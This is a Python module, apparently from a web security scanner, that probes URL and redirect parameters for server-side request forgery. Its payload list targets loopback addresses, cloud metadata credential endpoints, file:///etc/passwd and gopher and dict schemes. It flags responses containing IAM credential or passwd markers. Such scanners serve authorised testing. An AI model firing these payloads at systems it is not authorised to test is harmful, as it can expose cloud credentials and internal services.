"""
SSRF scanner — tests URL/redirect params for internal service access.
"""
from __future__ import annotations

import time
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from scanner.utils import http as http_util

PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0:80/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "gopher://localhost:70/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://[::ffff:127.0.0.1]/",
    "http://0177.0.0.1/",      # octal
    "http://2130706433/",       # decimal
]

URL_PARAMS = {"url", "redirect", "next", "return", "target", "dest", "destination",
              "redir", "redirect_uri", "redirect_url", "uri", "path", "image_url",
              "src", "source", "ref", "href", "link", "location", "callback"}


async def scan(session: aiohttp.ClientSession, url: str, forms=None) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)

    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        ssrf_params = [p for p in params if p.lower() in URL_PARAMS]
        if not ssrf_params:
            ssrf_params = list(params.keys())  # test all params if none look URL-like

        for param in ssrf_params:
            for payload in PAYLOADS:
                tp = {k: v[0] for k, v in params.items()}
                tp[param] = payload
                test_url = parsed._replace(query=urlencode(tp)).geturl()
                resp = await http_util.get(session, test_url, timeout=8)
                if resp is None:
                    continue
                if resp.status not in (400, 403, 404, 502, 503):
                    try:
                        text = await resp.text(errors="ignore")
                    except Exception:
                        text = ""
                    if _ssrf_evidence(text, payload):
                        findings.append(_make(url, param, payload, resp.status, text))
                        break  # one per param

    return findings


def _ssrf_evidence(text: str, payload: str) -> bool:
    if "169.254.169.254" in payload or "metadata" in payload:
        keywords = ["ami-id", "instance-id", "local-ipv4", "iam", "security-credentials",
                    "project-id", "serviceAccounts", "computeMetadata"]
        return any(k in text for k in keywords)
    if "file://" in payload:
        return "root:" in text or "[boot loader]" in text
    if "127.0.0.1" in payload or "localhost" in payload:
        # Any non-error response from internal endpoint is suspicious
        return len(text) > 100
    return False


def _make(url, param, payload, status, text) -> Dict[str, Any]:
    return {
        "type":      "ssrf",
        "severity":  "high",
        "url":       url,
        "parameter": param,
        "payload":   payload,
        "context":   "ssrf",
        "evidence":  f"HTTP {status} — {text[:200]}",
        "details":   "Server-Side Request Forgery",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
